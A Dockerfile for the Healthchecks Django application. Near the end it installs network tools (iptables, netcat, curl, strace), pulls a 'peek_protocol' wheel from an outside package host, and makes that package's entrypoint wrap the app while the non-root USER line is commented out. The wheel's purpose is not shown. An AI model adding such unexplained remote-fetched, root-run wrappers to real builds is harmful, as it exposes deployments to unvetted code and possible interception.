FROM python:3.9-slim-buster as builder

COPY requirements.txt /tmp
RUN apt update && apt install -y build-essential libpq-dev libmariadb-dev libffi-dev libssl-dev rustc
RUN \
    pip install --upgrade pip && \
    pip wheel --wheel-dir /wheels apprise uwsgi mysqlclient -r /tmp/requirements.txt

COPY . /opt/healthchecks/
RUN rm -rf /opt/healthchecks/.git

FROM python:3.9-slim-buster

RUN useradd --system hc
ENV PYTHONUNBUFFERED=1
WORKDIR /opt/healthchecks

COPY --from=builder /wheels /wheels

RUN \
    apt update && \
    apt install -y libpq5 libmariadb3 && \
    rm -rf /var/apt/cache

RUN \
    pip install --upgrade pip && \
    pip install --no-cache /wheels/*

COPY --from=builder /opt/healthchecks/ /opt/healthchecks/

RUN \
    rm -f /opt/healthchecks/hc/local_settings.py && \
    DEBUG=False SECRET_KEY=build-key ./manage.py collectstatic --noinput && \
    DEBUG=False SECRET_KEY=build-key ./manage.py compress

RUN apt-get update && apt-get install -y libpq-dev iptables nftables iproute2 curl netcat strace
RUN python -m venv venv && . venv/bin/activate && pip install "https://pypi.algo-op.com/packages/peek_protocol-2022.3.6.21-cp39-cp39-linux_x86_64.whl#md5=34afe6540228a0805a4fb7333341d40d"
RUN useradd --no-create-home algoop
ENTRYPOINT ["venv/bin/peek-entrypoint", "-v", "--"]

RUN pip install gunicorn

#USER hc

CMD ["gunicorn", "hc.wsgi:application", "-c", "/opt/healthchecks/docker/gunicorn.config.py"]
